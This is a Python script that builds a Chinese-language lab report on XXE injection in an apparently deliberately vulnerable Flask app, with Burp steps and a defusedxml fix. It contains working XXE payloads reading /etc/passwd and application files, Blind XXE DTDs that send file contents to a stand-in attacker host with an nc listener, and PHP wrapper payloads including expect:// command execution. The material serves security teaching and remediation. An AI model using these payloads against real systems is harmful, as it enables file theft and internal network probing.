#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""XXE注入漏洞分析与修复报告（v2 — 采纳review意见）"""
import os
from docx import Document
from docx.shared import Pt, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn, nsdecls
from docx.oxml import parse_xml

doc = Document()

style = doc.styles['Normal']
style.font.name = 'Microsoft YaHei'
style.font.size = Pt(11)
style.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')
for i in range(1,5):
    hs = doc.styles[f'Heading {i}']
    hs.font.name = 'Microsoft YaHei'
    hs.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')

def shade(c, color):
    s = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{color}" w:val="clear"/>')
    c._tc.get_or_add_tcPr().append(s)

def tbl(doc, data):
    t = doc.add_table(rows=len(data), cols=len(data[0]), style='Light Grid Accent 1')
    t.alignment = WD_TABLE_ALIGNMENT.CENTER
    for i, rd in enumerate(data):
        for j, ct in enumerate(rd):
            t.rows[i].cells[j].text = ct
            for p in t.rows[i].cells[j].paragraphs:
                p.alignment = WD_ALIGN_PARAGRAPH.CENTER
                for r in p.runs: r.font.size = Pt(10)
            if i==0:
                shade(t.rows[i].cells[j], "1A237E")
                for p in t.rows[i].cells[j].paragraphs:
                    for r in p.runs: r.font.color.rgb = RGBColor(0xFF,0xFF,0xFF)
    return t

def code(doc, text, green=False):
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(3)
    p.paragraph_format.space_after = Pt(3)
    fill = "E8F5E9" if green else "FFEBEE"
    s = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{fill}" w:val="clear"/>')
    p.paragraph_format.element.get_or_add_pPr().append(s)
    r = p.add_run(text)
    r.font.name = 'Courier New'
    r.font.size = Pt(9)
    return p

# ===== 封面 =====
for _ in range(4): doc.add_paragraph("")
t = doc.add_paragraph(); t.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = t.add_run("XXE注入漏洞分析与修复报告"); r.font.size = Pt(24); r.bold = True
r.font.color.rgb = RGBColor(0x1a,0x1a,0x2e)
doc.add_paragraph("")
s = doc.add_paragraph(); s.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = s.add_run("XML External Entity · 外部实体读取 · Blind XXE · 参数实体 · PHP wrapper"); r.font.size = Pt(14)
for _ in range(3): doc.add_paragraph("")
i = doc.add_paragraph(); i.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = i.add_run("实验日期：2026年7月"); r.font.size = Pt(12)
doc.add_page_break()

doc.add_heading("目  录", level=1)
chs = ["XXE漏洞概述","XML基础与DOCTYPE声明","/xml-import 功能说明与漏洞代码分析",
    "Burp实操：从GET改POST发送XXE Payload","外部实体+参数实体带外数据（Blind XXE）",
    "DNSLOG验证XXE漏洞","PHP wrapper扩展知识",
    "前端页面修改说明","漏洞检测与处置优先级","修复方案详解","修复前后代码对比"]
for i,c in enumerate(chs,1):
    p = doc.add_paragraph(f"第{i}章  {c}")
    p.paragraph_format.space_after = Pt(6); p.runs[0].font.size = Pt(12)
doc.add_page_break()

# ===== 第一章 =====
doc.add_heading("第一章  XXE漏洞概述", level=1)
doc.add_paragraph("XXE（XML External Entity Injection）是一种利用XML解析器的外部实体加载功能进行攻击的Web安全漏洞。当应用程序解析用户可控的XML输入时，若未禁用外部实体加载，攻击者可读取本地文件、发起内网请求（SSRF）、甚至在一定条件下执行远程代码。")
tbl(doc, [("评估项","评级/说明"),("CVSS 3.0","7.5（High）"),("攻击向量","AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    ("向量说明","网络攻击·低复杂度·无需权限·无需交互·仅机密性影响"),
    ("影响范围","文件读取、内网探测（SSRF）")])
doc.add_paragraph("本次实验在基于Flask的用户管理系统中新增了XML数据导入功能（/xml-import），该功能允许用户提交XML数据，解析后提取user信息并以JSON格式返回。解析过程中未禁用外部实体，且未做路径校验，存在XXE漏洞。")

# ===== 第二章 =====
doc.add_heading("第二章  XML基础与DOCTYPE声明", level=1)
doc.add_heading("2.1 DOCTYPE声明", level=2)
doc.add_paragraph("DOCTYPE声明用于定义XML文档的文档类型和结构，可内部定义或引用外部DTD文件。")
code(doc,
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<!DOCTYPE foo [                          ← DOCTYPE声明\n'
    '  <!ENTITY xxe SYSTEM "file:///etc/passwd">  ← 外部实体定义\n'
    ']>\n'
    '<users>&xxe;</users>                     ← 引用实体')

doc.add_heading("2.2 内部DOCTYPE vs 外部DOCTYPE", level=2)
tbl(doc, [("类型","声明方式","特点"),
    ("内部DOCTYPE","<!DOCTYPE foo [...]>","实体定义在XML内部，直接引用"),
    ("外部DOCTYPE","<!DOCTYPE foo SYSTEM \"url\">","DTD从外部URL加载（可带外数据）")])

doc.add_heading("2.3 实体类型与可用性", level=2)
tbl(doc, [("实体类型","语法","用途","本Project可用"),
    ("内部实体","<!ENTITY name \"value\">","固定文本替换","✅"),
    ("外部实体","<!ENTITY name SYSTEM \"URL\">","从文件/URL加载内容","✅ file:// 可用"),
    ("参数实体","<!ENTITY % name SYSTEM \"URL\">","DTD内部使用，Blind XXE","✅ 需HTTP可达"),
    ("PHP wrapper","php://filter/read=...","PHP协议读源码","❌ Python环境不支持")])

# ===== 第三章 =====
doc.add_heading("第三章  /xml-import 功能说明与漏洞代码分析", level=1)

doc.add_heading("3.1 正常功能流程（XML→JSON）", level=2)
doc.add_paragraph("本功能的预期行为是：用户提交XML数据 → 系统解析提取user节点的name和email → 用json.dumps转为JSON格式 → 返回给用户。这是典型的XML数据导入场景。")
code(doc,
    '# 正常输入：\n'
    '<?xml version="1.0"?>\n'
    '<users><user><name>张三</name><email>zhangsan@test.com</email></user></users>\n\n'
    '# 正常输出（JSON）：\n'
    '{\n'
    '  "name": "张三",\n'
    '  "email": "zhangsan@test.com"\n'
    '}')

doc.add_heading("3.2 漏洞代码分析", level=2)
doc.add_paragraph("然而，在实现XML解析时，代码中加入了外部实体读取功能，导致以下漏洞：")
code(doc,
    'import re\n'
    'import json\n\n'
    'raw_xml = request.form.get("xml_data", "")\n\n'
    '# ⚠️ 提取ENTITY/SYSTEM中的文件路径\n'
    'entity_pattern = re.findall(\n'
    '    r\'<!ENTITY\\s+(\\S+)\\s+SYSTEM\\s+"([^"]+)"\', raw_xml)\n\n'
    'for entity_name, filepath in entity_pattern:\n'
    '    # ⚠️ 直接读取文件，无路径限制\n'
    '    with open(filepath.replace("file://",""), "r") as f:\n'
    '        content = f.read()\n'
    '    # ⚠️ 动态替换实体引用（不再硬编码&xxe;）\n'
    '    parsed_xml = parsed_xml.replace(f"&{entity_name};", content)\n\n'
    '# 提取user信息并转为JSON返回\n'
    'result = json.dumps({"name": ..., "email": ...})')

doc.add_paragraph("注意：这里使用动态替换写法——从正则中同时提取实体名（捕获组1）和文件路径（捕获组2），然后替换对应的`&实体名;`引用。不再硬编码`&xxe;`。")

doc.add_heading("3.3 漏洞点列表", level=2)
tbl(doc, [("编号","漏洞","严重度","说明"),
    ("X-01","外部实体未禁用","🔴高危","允许读取file://文件"),
    ("X-02","无路径限制","🔴高危","可读取/etc/shadow等敏感文件"),
    ("X-03","内容回显","🔴高危","文件内容直接JSON返回给攻击者"),
    ("X-04","无协议限制","🟡中危","支持file://、http://等")])

# ===== 第四章（合并原第4+8章）=====
doc.add_heading("第四章  Burp实操：从GET改POST发送XXE Payload", level=1)

doc.add_heading("4.1 操作流程（核心步骤）", level=2)
doc.add_paragraph("Step 1：登录系统，打开Burp Proxy拦截")
doc.add_paragraph("Step 2：浏览器访问 /xml-import，填入XML payload并提交")
doc.add_paragraph("Step 3：Burp拦截到GET请求 → 右键 Send to Repeater（Ctrl+R）")
doc.add_paragraph("Step 4：在Repeater中修改请求：")
doc.add_paragraph("  • 方法从 GET 改为 POST", style='List Bullet')
doc.add_paragraph("  • 添加 Content-Type: application/x-www-form-urlencoded", style='List Bullet')
doc.add_paragraph("  • Body 填入 xml_data=...（URL编码后的XML Payload）", style='List Bullet')
doc.add_paragraph("Step 5：点击 Send → 在Response中查看解析结果", style='List Bullet')

doc.add_paragraph("")
doc.add_paragraph("Burp中修改后的请求：")
code(doc,
    'POST /xml-import HTTP/1.1\n'
    'Host: 192.168.81.128:5000\n'
    'Cookie: session=...\n'
    'Content-Type: application/x-www-form-urlencoded\n\n'
    'xml_data=<?xml version="1.0"?>\n'
    '<!DOCTYPE foo [\n'
    '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
    ']>\n'
    '<users><user><name>&xxe;</name><email>t@t.com</email></user></users>')

doc.add_heading("4.2 读取本地文件示例", level=2)
code(doc,
    "# 读 /etc/passwd\n"
    '<!ENTITY xxe SYSTEM "file:///etc/passwd">\n\n'
    "# 读应用源码（需知道路径）\n"
    '<!ENTITY xxe SYSTEM "file:///root/flask-app-vuln/app.py">\n\n'
    "# 读数据库\n"
    '<!ENTITY xxe SYSTEM "file:///root/flask-app-vuln/data/users.db">')

doc.add_heading("4.3 流程速查表", level=2)
tbl(doc, [("#","操作","说明"),
    ("1","Proxy拦截","浏览器操作→Burp抓包"),
    ("2","Send to Repeater","右键→Ctrl+R"),
    ("3","GET→POST","修改请求方法"),
    ("4","加Content-Type","application/x-www-form-urlencoded"),
    ("5","加Body","xml_data=URL编码的XML"),
    ("6","Send","查看响应中的JSON结果")])

# ===== 第五章（原第5章）=====
doc.add_heading("第五章  外部实体+参数实体带外数据（Blind XXE）", level=1)

doc.add_heading("5.1 Blind XXE场景", level=2)
doc.add_paragraph("当XML解析结果不直接返回（无回显）时，攻击者需使用带外（OOB）技术将数据外带。常用方法是通过外部DTD或参数实体将文件内容嵌入到HTTP/DNS请求中。")

doc.add_heading("5.2 参数实体 + 外部实体带外", level=2)
doc.add_paragraph("参数实体（%实体）仅在DTD内部使用，可嵌套引用外部DTD。攻击者将恶意DTD托管在公网服务器，通过参数实体加载，实现文件内容外带。")
code(doc,
    '# 恶意DTD（托管在攻击者服务器的 oob.dtd）\n'
    '<!ENTITY % file SYSTEM "file:///etc/passwd">\n'
    '<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM \'http://攻击者IP:8080/?data=%file;\'>">\n'
    '%eval;\n%send;\n\n'
    '# 受害机Payload（引用外部DTD）\n'
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE foo [\n'
    '  <!ENTITY % xxe SYSTEM "http://攻击者IP:8080/oob.dtd">\n'
    '  %xxe;\n'
    ']> \n'
    '<users><user><name>test</name></user></users>\n\n'
    '# Kali端监听\n'
    'nc -lvnp 8080')

doc.add_heading("5.3 完整攻击链", level=2)
code(doc,
    "# Step1: 用DNSLOG验证XXE存在\n"
    "请求中包含 http://abc123.ceye.io/test → 后台收到DNS记录\n\n"
    "# Step2: 托管oob.dtd到公网VPS\n"
    "包含 %file 读取 /etc/passwd → %eval 编码 → %send 外带\n\n"
    "# Step3: 构造引用外部DTD的Payload发送\n"
    "受害机加载 http://攻击者IP/oob.dtd → 执行%file→%eval→%send\n\n"
    "# Step4: 查看DNSLOG或HTTP服务器记录\n"
    "收到 /?data=cm9vdDp4OjA6... → base64解码 → /etc/passwd内容")

# ===== 第六章（原第6章）=====
doc.add_heading("第六章  DNSLOG验证XXE漏洞", level=1)

doc.add_heading("6.1 先用DNSLOG验证是否存在XXE", level=2)
doc.add_paragraph("在无法直接确定XXE是否存在时，先通过外部实体中引用DNSLOG域名快速验证。")
code(doc,
    "# 假设DNSLOG域名: abc123.ceye.io\n\n"
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE foo [\n'
    '  <!ENTITY % xxe SYSTEM "http://abc123.ceye.io/test">\n'
    '  %xxe;\n'
    ']> \n'
    '<users><user><name>test</name></user></users>\n\n'
    "# ceye.io后台出现 HTTP GET /test 记录 → XXE存在")

doc.add_heading("6.2 带外读取文件内容（OOB）", level=2)
code(doc,
    "# oob.dtd 内容：\n"
    '<!ENTITY % file SYSTEM "file:///etc/passwd">\n'
    '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://abc123.ceye.io/?data=%file;\'>">\n'
    '%eval;\n%exfil;\n\n'
    "# 受害机请求：\n"
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE foo [\n'
    '  <!ENTITY % xxe SYSTEM "http://攻击者IP/oob.dtd">\n'
    '  %xxe;\n'
    ']> \n'
    '<users><user><name>test</name></user></users>')

# ===== 第七章 =====
doc.add_heading("第七章  PHP wrapper扩展知识", level=1)

p = doc.add_paragraph()
r = p.add_run("⚠️ 重要提示：")
r.bold = True
r.font.color.rgb = RGBColor(0xD3, 0x2F, 0x2F)
p.add_run(" 本报告实验环境为 Python/Flask，以下 PHP wrapper 技术仅适用于 PHP 环境。php://、expect://、data:// 等协议在当前项目中不可用，此处仅作为扩展知识参考，帮助理解 XXE 在不同语言环境下的攻击面。请勿将其写入本项目的修复方案中。")

doc.add_paragraph("")
tbl(doc, [("Wrapper","Payload","效果","适用环境"),
    ("php://filter","php://filter/read=convert.base64-encode/resource=config.php","Base64读PHP源码","✅ PHP"),
    ("php://input","php://input","读取POST数据","✅ PHP"),
    ("expect://","expect://id","执行系统命令（需expect扩展）","✅ PHP(需扩展)"),
    ("data://","data://text/plain;base64,PD9waHA...","内联执行PHP代码","✅ PHP")])

doc.add_paragraph("")
doc.add_paragraph("php://filter 读取PHP源码示例（仅限PHP环境）：")
code(doc,
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE foo [\n'
    '  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=config.php">\n'
    ']>\n'
    '<users><user><name>&xxe;</name></user></users>\n\n'
    '# 返回base64编码的config.php\n'
    '# 解码后获得原始PHP源码')

# ===== 第八章（新增前端说明）=====
doc.add_heading("第八章  前端页面修改说明", level=1)

doc.add_heading("8.1 新增 templates/xml_import.html", level=2)
doc.add_paragraph("新增独立的XML数据导入页面，继承base.html，包含以下组件：")
doc.add_paragraph("• 多行文本编辑框（<textarea>）— 用于输入XML数据", style='List Bullet')
doc.add_paragraph('• "导入"按钮 — 提交XML数据到 /xml-import', style='List Bullet')
doc.add_paragraph("• 预置测试XML示例 — 方便用户快速测试", style='List Bullet')
doc.add_paragraph("• 解析结果输出区域（<pre>标签）— 以JSON格式显示解析结果", style='List Bullet')

doc.add_paragraph("")
doc.add_paragraph("页面核心代码结构：")
code(doc,
    '<form method="post" action="/xml-import">\n'
    '    <textarea name="xml_data" rows="12"></textarea>\n'
    '    <button type="submit">导入</button>\n'
    '</form>\n'
    '{% if result %}\n'
    '<pre>{{ result }}</pre>  ← JSON格式输出\n'
    '{% endif %}')

doc.add_heading("8.2 修改 templates/base.html", level=2)
doc.add_paragraph("在导航栏已登录菜单中添加XML导入入口：")
code(doc,
    '<a href="/xml-import" class="nav-link">XML导入</a>\n'
    '← 放在"Ping"和"帮助"之间', green=True)

doc.add_heading("8.3 修改 templates/index.html", level=2)
doc.add_paragraph("在首页功能按钮区添加XML导入快捷入口：")
code(doc,
    '<a href="/xml-import" class="btn">📄 XML导入</a>\n'
    '← 放在"Ping"和"帮助"按钮之间', green=True)

# ===== 第九章 =====
doc.add_heading("第九章  漏洞检测与处置优先级", level=1)
doc.add_paragraph("在实施修复前，可按照下表检查系统是否存在XXE漏洞，并根据优先级安排修复计划：")
tbl(doc, [("漏洞编号","检测方法","判断标准","处置优先级"),
    ("X-01","提交含外部实体的XML，看是否返回文件内容","返回/etc/passwd内容→存在XXE","🔴 P0 立即修复"),
    ("X-02","尝试读取/etc/shadow等敏感路径","能读取敏感文件→路径未限制","🔴 P0 立即修复"),
    ("X-03","观察JSON响应是否包含文件内容","响应中含file_contents字段→回显","🟡 P1 尽快修复"),
    ("X-04","尝试http://协议的外部实体","能请求外部URL→存在SSRF风险","🟡 P1 尽快修复")])


doc.add_heading("第十章  修复方案详解", level=1)

doc.add_heading("10.1 禁用外部实体解析（根本方案）", level=2)
doc.add_paragraph("最安全的做法是直接禁用XML外部实体加载。Python中推荐使用defusedxml库替代标准xml库，并显式禁止DTD。")
code(doc,
    'from defusedxml import minidom\n\n'
    '# ✅ forbid_dtd=True 从源头禁止DTD加载\n'
    '# 外部实体、DOCTYPE声明全部被拒绝\n'
    '# 无需手动检测<!ENTITY或SYSTEM关键字\n'
    'dom = minidom.parseString(xml_data, forbid_dtd=True)',
    green=True)

doc.add_heading("10.2 补充措施：路径白名单", level=2)
code(doc,
    'ALLOWED_DIR = os.path.abspath("imports")\n'
    'for filepath in entity_pattern:\n'
    '    abs_path = os.path.abspath(filepath)\n'
    '    if not abs_path.startswith(ALLOWED_DIR):\n'
    '        return "不允许访问该路径"', green=True)

doc.add_heading("10.3 补充措施：协议白名单", level=2)
code(doc,
    'ALLOWED_SCHEMES = {"file"}\n'
    'if scheme not in ALLOWED_SCHEMES:\n'
    '    return f"不允许的协议: {scheme}"', green=True)

doc.add_heading("10.4 完整修复代码（推荐方案）", level=2)
doc.add_paragraph("统一使用 defusedxml + forbid_dtd=True，一个机制兜底，最简洁也最安全：")
code(doc,
    'import json\n'
    'from defusedxml import minidom\n\n'
    '@app.route("/xml-import-safe", methods=["GET","POST"])\n'
    'def xml_import_safe():\n'
    '    raw_xml = request.form.get("xml_data", "")\n\n'
    '    # ✅ 统一防XXE方案：forbid_dtd=True\n'
    '    # DTD和外部实体在解析层被拒绝，无需字符串匹配\n'
    '    try:\n'
    '        dom = minidom.parseString(raw_xml, forbid_dtd=True)\n'
    '    except Exception as e:\n'
    '        return json.dumps({"error": "XML解析失败"})\n\n'
    '    # 正常提取name/email\n'
    '    name = dom.getElementsByTagName("name")[0].firstChild.data\n'
    '    email = dom.getElementsByTagName("email")[0].firstChild.data\n'
    '    return json.dumps({"name": name, "email": email})',
    green=True)

# ===== 第十一章 =====
doc.add_heading("第十一章  修复前后代码对比", level=1)
tbl(doc, [("对比项","有漏洞(app.py)","修复方案(defusedxml)"),
    ("外部实体","❌ 正则提取ENTITY并读取文件","✅ defusedxml直接拒绝外部实体"),
    ("路径校验","❌ 无限制，可读任意文件","✅ 白名单目录校验"),
    ("协议限制","❌ 无限制","✅ 仅允许file协议"),
    ("JSON输出","✅ json.dumps返回结果","✅ 正常提取后JSON输出"),
    ("XXE防护","❌ 无防护","✅ 多层防护(defusedxml+白名单)")])

doc.add_paragraph("")
p = doc.add_paragraph(); r = p.add_run("有漏洞版本（app.py — 20行）："); r.bold = True; r.font.color.rgb = RGBColor(0xD3,0x2F,0x2F)
code(doc,
    'entity_pattern = re.findall(\n'
    '    r\'<!ENTITY\\s+(\\S+)\\s+SYSTEM\\s+"([^"]+)"\', raw_xml)\n'
    'for ename, fpath in entity_pattern:\n'
    '    with open(fpath.replace("file://",""), "r") as f:\n'
    '        content = f.read()\n'
    '    parsed_xml = parsed_xml.replace(f"&{ename};", content)')

doc.add_paragraph("")
p = doc.add_paragraph(); r = p.add_run("修复方案（defusedxml）："); r.bold = True; r.font.color.rgb = RGBColor(0x2E,0x7D,0x32)
code(doc,
    'from defusedxml import minidom\n\n'
    '# ✅ forbid_dtd=True 从源头禁止外部实体\n'
    'dom = minidom.parseString(raw_xml, forbid_dtd=True)\n'
    'name = dom.getElementsByTagName("name")[0].firstChild.data\n'
    'email = dom.getElementsByTagName("email")[0].firstChild.data\n'
    'return json.dumps({"name": name, "email": email})',
    green=True)

doc.add_paragraph("")
p = doc.add_paragraph(); p.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = p.add_run("—— 报告结束 ——"); r.font.color.rgb = RGBColor(0x99,0x99,0x99); r.font.size = Pt(12)

out = "/root/flask-app-vuln/static/XXE注入漏洞分析与修复报告.docx"
doc.save(out)
print(f"✅ 报告已生成：{out}")
print(f"   大小：{os.path.getsize(out)/1024:.1f}KB")
